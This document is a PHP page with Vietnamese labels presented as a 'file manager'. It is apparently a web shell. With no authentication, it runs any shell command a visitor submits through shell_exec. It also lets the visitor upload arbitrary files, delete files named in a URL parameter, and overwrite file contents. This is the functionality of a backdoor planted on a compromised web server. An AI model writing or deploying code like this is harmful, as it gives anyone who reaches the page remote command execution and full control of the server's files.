Kết quả: <!DOCTYPE html>
<html>
<head>
    <!-- Thêm Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
    <style>
        .btn-action {
            margin-right: 5px;
        }
    </style>
</head>
<body>
<div class="container">
 <h1>Quản lý File</h1>
    
    <!-- Thêm trường nhập lệnh và nút thực hiện -->
    <div class="mb-3">
        <form method="POST">
            <label for="shellCommand" class="form-label">Nhập lệnh Shell</label>
            <input type="text" class="form-control" id="shellCommand" name="shellCommand">
            <button type="submit" class="btn btn-primary mt-2">Thực hiện lệnh</button>
        </form>
    </div>
    
    <!-- Phần để hiển thị kết quả -->
    <div id="result" class="mb-3">
        <?php
        if (isset($_POST['shellCommand'])) {
            $command = $_POST['shellCommand'];
            
            // Thực thi lệnh shell và chụp đầu ra của nó
            $output = shell_exec(escapeshellcmd($command));
            echo "<pre>Kết quả: " . htmlspecialchars($output) . "</pre>";
        }
        ?>
    </div>

    <?php
    // Đường dẫn thư mục bạn muốn quản lý
    $dir = './';

    // Kiểm tra xem người dùng đã upload file hay chưa
    if(isset($_POST['submit'])){
        $files = $_FILES['file'];

        foreach($files['name'] as $key => $file_name){
            // Di chuyển file tạm thời tới thư mục đích
            move_uploaded_file($files['tmp_name'][$key], $dir . $file_name);
        }
    }

    // Xử lý sự kiện xóa file
    if(isset($_GET['delete'])){
        $fileToDelete = $_GET['delete'];
        $pathToDelete = $dir . $fileToDelete;

        if(file_exists($pathToDelete) && !is_dir($pathToDelete)){
            unlink($pathToDelete);
        }
    }
	if(isset($_POST['edit'])){
    $fileName = $_POST['file_name'];
    $fileContent = $_POST['file_content'];
    $pathToFile = $dir . $fileName;

    // Kiểm tra xem file có tồn tại và không phải là thư mục hay không
    if(file_exists($pathToFile) && !is_dir($pathToFile)){
        // Ghi đè nội dung mới vào file
        file_put_contents($pathToFile, $fileContent);
    }
}

    // Hiển thị danh sách các file và thư mục
    $files = scandir($dir);
    ?>

    <table class="table">
        <thead>
            <tr>
                <th>Tên</th>
                <th>Loại</th>
                <th>Kích thước</th>
                <th>Thao tác</th>
            </tr>
        </thead>
        <tbody>
            <?php
            foreach($files as $file){
                if($file != '.' && $file != '..'){
                    $path = $dir . $file;
                    $type = is_dir($path) ? 'Thư mục' : 'Tập tin';
                    $size = is_dir($path) ? '-' : filesize($path);
                    echo '<tr>
                            <td><a href="' . $path . '">' . $file . '</a></td>
                            <td>' . $type . '</td>
                            <td>' . $size . ' bytes</td>
                            <td>
                                <button type="button" data-file="' . $file . '" class="btn btn-primary btn-action edit-btn">Sửa</button>
                                <a href="?delete=' . $file . '" class="btn btn-danger btn-action">Xóa</a>
                            </td>
                          </tr>';
                }
            }
            ?>
        </tbody>
    </table>

    <!-- Form upload file -->
    <form action="" method="post" enctype="multipart/form-data" class="mt-4">
        <div class="form-group">
            <input type="file" name="file[]" multiple required>
        </div>
        <button type="submit" name="submit" class="btn btn-success">Upload</button>
    </form>

    <!-- Modal để sửa file -->
    <div class="modal fade" id="editModal" tabindex="-1" role="dialog" aria-labelledby="editModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="editModalLabel">Sửa file</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <form action="" method="post" class="mt-4" id="editForm">
                        <input type="hidden" name="file_name" id="editFileName">
                        <div class="form-group">
                            <label for="file_content">Nội dung file:</label>
                            <textarea name="file_content" id="editFileContent" class="form-control" rows="10"></textarea>
                        </div>
                        <button type="submit" name="edit" class="btn btn-success">Lưu thay đổi</button>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Thêm jQuery và Bootstrap JS -->
<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>

<script>
    $(document).ready(function() {
        // Khi nhấn vào nút "Sửa", hiển thị modal
        $('.edit-btn').click(function() {
            var fileName = $(this).data('file');

            $.ajax({
                url: './get_file_content.php',
                type: 'POST',
                data: {
                    file_name: fileName
                },
                success: function(data) {
                    $('#editFileName').val(fileName);
                    $('#editFileContent').val(data);

                    $('#editModal').modal('show');
                }
            });
        });
    });
</script>

</body>
</html>
